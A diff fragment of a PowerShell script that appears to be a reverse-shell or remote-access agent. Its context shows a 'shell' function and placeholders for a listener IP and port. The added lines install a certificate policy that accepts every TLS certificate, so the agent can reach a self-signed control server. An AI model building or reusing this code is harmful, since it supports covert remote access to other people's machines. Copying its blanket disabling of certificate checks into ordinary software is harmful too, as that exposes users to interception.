@@ -65,6 +65,20 @@ function shell($fname, $arg){
     $res
 }
 
+# Bypassign selfsigned certs error
+add-type @"
+    using System.Net;
+    using System.Security.Cryptography.X509Certificates;
+    public class TrustAllCertsPolicy : ICertificatePolicy {
+        public bool CheckValidationResult(
+            ServicePoint srvPoint, X509Certificate certificate,
+            WebRequest request, int certificateProblem) {
+            return true;
+        }
+    }
+"@
+[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
+
 $ip   = "XXX_listener_ip_placeholder_XXX"
 $port = "XXX_listener_port_placeholder_XXX"
 ## secrets.token_hex(32)
